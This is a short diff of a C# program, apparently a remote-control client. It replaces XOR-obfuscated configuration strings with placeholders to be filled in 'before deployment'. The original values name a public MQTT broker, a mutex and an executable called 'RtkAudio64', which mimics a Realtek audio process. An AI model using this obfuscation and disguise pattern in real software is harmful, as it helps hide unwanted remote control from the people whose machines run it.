@@ -17,10 +17,14 @@ using System.Runtime.ExceptionServices;
 
 class Program
 {
-    static byte[] sk = { 52, 59, 58, 59, 44, 56, 58, 32, 38, 10, 39, 48, 56, 58, 33, 48, 10, 38, 61, 48, 57, 57, 10, 108, 108, 103, 100 }; // secretId
-    static byte[] bk = { 55, 39, 58, 62, 48, 39, 123, 61, 60, 35, 48, 56, 36, 123, 54, 58, 56 }; // broker
-    static byte[] mk = { 7, 3, 6, 10, 16, 45, 48, 54, 32, 33, 58, 39, 10, 24, 32, 33, 48, 45, 10 }; // mutex
-    static byte[] uk = { 2, 60, 59, 49, 58, 34, 38, 0, 37, 49, 52, 33, 48, 39 }; // RtkAudio64
+    // ⚠️ IMPORTANT: Change these values to your own unique identifiers before deployment
+    // These are XOR-encrypted strings. Use the D() function to decrypt them.
+    // Example: To use "my_secret_id", XOR each character with 0x55 and put the bytes here
+    
+    static byte[] sk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: Your unique Secret ID (XOR encrypted with 0x55)
+    static byte[] bk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: MQTT Broker address (e.g., "broker.hivemq.com" XOR encrypted)
+    static byte[] mk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: Mutex name (XOR encrypted)
+    static byte[] uk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: Executable name (e.g., "RtkAudio64" XOR encrypted)
     
     static string secretId = D(sk);
     static string machineId = Environment.MachineName + "_" + Environment.UserName;
